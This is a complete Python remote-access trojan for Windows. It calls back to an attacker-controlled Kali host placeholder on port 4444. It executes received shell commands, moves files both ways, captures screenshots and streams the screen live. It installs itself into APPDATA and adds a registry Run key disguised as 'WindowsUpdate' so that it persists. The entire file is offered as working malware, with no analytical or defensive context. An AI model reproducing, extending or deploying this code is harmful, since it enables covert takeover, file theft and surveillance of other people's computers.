import socket
import subprocess
import os
import struct
import pyautogui
import shutil
import time
import io

HOST = "KALI_IP"  # Replace with your Kali IP
PORT = 4444

def reliable_send(s, data):
    data = data.encode()
    s.send(struct.pack('>I', len(data)) + data)

def reliable_recv(s):
    data_len = struct.unpack('>I', s.recv(4))[0]
    return s.recv(data_len).decode()

def persistence():
    try:
        path = os.environ["APPDATA"] + "\\WindowsPayload.exe"
        if not os.path.exists(path):
            shutil.copyfile(os.path.abspath(__file__), path)
            os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "{path}"')
    except:
        pass

def handle_command(s, command):
    if command.lower() == "exit":
        s.close()
        return False

    elif command.startswith("cd "):
        try:
            os.chdir(command[3:])
            reliable_send(s, "Changed directory.")
        except:
            reliable_send(s, "Failed to change directory.")

    elif command.strip() == "ls":
        output = subprocess.getoutput("dir")
        reliable_send(s, output)

    elif command.startswith("download "):
        filename = command.split(" ", 1)[1]
        try:
            with open(filename, "rb") as f:
                data = f.read()
                s.send(struct.pack('>I', len(data)) + data)
        except:
            s.send(struct.pack('>I', 0) + b"")

    elif command.startswith("upload "):
        filename = command.split(" ", 1)[1]
        data_len = struct.unpack('>I', s.recv(4))[0]
        file_data = b''
        while len(file_data) < data_len:
            file_data += s.recv(data_len - len(file_data))
        with open(filename, "wb") as f:
            f.write(file_data)

    elif command == "screenshot":
        screenshot = pyautogui.screenshot()
        screenshot.save("temp.png")
        with open("temp.png", "rb") as f:
            data = f.read()
            s.send(struct.pack('>I', len(data)) + data)
        os.remove("temp.png")

    elif command == "livescreen":
        s.send(b"START")
        while True:
            screenshot = pyautogui.screenshot()
            buffer = io.BytesIO()
            screenshot.save(buffer, format="JPEG", quality=50)
            img_data = buffer.getvalue()
            buffer.close()

            s.send(struct.pack('>I', len(img_data)) + img_data)

            s.settimeout(0.1)
            try:
                stop_signal = s.recv(5).decode()
                if stop_signal == "STOP":
                    s.settimeout(None)
                    break
            except:
                continue

    else:
        output = subprocess.getoutput(command)
        reliable_send(s, output)
    return True

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))

            while True:
                command = reliable_recv(s)
                if not handle_command(s, command):
                    break
        except:
            time.sleep(5)

# Enable persistence
persistence()
connect()
